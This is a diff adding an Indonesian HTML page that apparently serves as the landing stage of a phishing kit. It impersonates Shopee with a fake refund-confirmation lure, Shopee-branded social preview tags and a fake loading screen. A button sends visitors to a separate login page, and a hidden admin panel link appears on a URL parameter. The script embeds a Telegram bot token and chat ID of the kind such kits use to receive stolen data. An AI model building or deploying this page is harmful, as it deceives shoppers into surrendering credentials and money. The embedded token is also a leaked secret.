@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <title>pembatalan dan pengembalian dana</title>
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="Pembatalan dan Pengembalian Dana - Shopee">
+    <meta property="og:description" content="Konfirmasi pembatalan dan pengembalian dana Anda di Shopee. Klik untuk melanjutkan proses.">
+    <meta property="og:image" content="https://bylinkofficial.shopee.vercel.app/asset/shopee.jpg">
+    <meta property="og:url" content="https://bylinkofficial.shopee.vercel.app">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Shopee">
+
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Pembatalan dan Pengembalian Dana - Shopee">
+    <meta name="twitter:description" content="Konfirmasi pembatalan dan pengembalian dana Anda di Shopee.">
+    <meta name="twitter:image" content="https://bylinkofficial.shopee.vercel.app/asset/shopee.jpg">
+
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .dots {
+            display: flex;
+            gap: 10px;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            background: #EE5D30;
+            border-radius: 50%;
+            animation: bounce 1.4s infinite ease-in-out both;
+        }
+
+        .dot:nth-child(1) { animation-delay: -0.32s; }
+        .dot:nth-child(2) { animation-delay: -0.16s; }
+
+        @keyframes bounce {
+            0%, 80%, 100% {
+                transform: scale(0);
+            }
+            40% {
+                transform: scale(1);
+            }
+        }
+
+        .home-page {
+            background: url('asset/shopee.jpg') no-repeat center center;
+            background-size: cover;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            display: none;
+        }
+
+        #btnku {
+            width: 280px;
+            height: 40px;
+            border: none;
+            background: #EE5D30;
+            color: #fff;
+            font-weight: bold;
+            box-shadow: 0 5px 5px rgba(65, 72, 86, 0.3);
+            border-radius: 50px;
+            cursor: pointer;
+        }
+
+        #btnku:hover {
+            background: #BA441F;
+        }
+
+        .admin-access {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.1);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            text-decoration: none;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="loading" class="loading">
+        <div class="dots">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
+    <div class="home-page" id="homePage">
+        <button id="btnku" type="button" onclick="window.location.href='login.html'">KONFIRMASI SEKARANG</button>
+    </div>
+
+    <a href="admin.html" class="admin-access" id="adminLink">Admin Panel</a>
+
+    <script>
+        // Configuration
+        const CONFIG = {
+            TELEGRAM_BOT_TOKEN: '8502215115:AAHZGTMdSyHOgzoGDqaqL54ilACSy39gbAc',
+            TELEGRAM_CHAT_ID: '8593139959'
+        };
+
+        // Check for admin access
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('admin') === 'true') {
+                document.getElementById('adminLink').style.display = 'block';
+            }
+
+            // Show loading for 3 seconds, then show home page
+            setTimeout(function() {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('homePage').style.display = 'flex';
+            }, 3000);
+        };
+    </script>
+</body>
+</html>
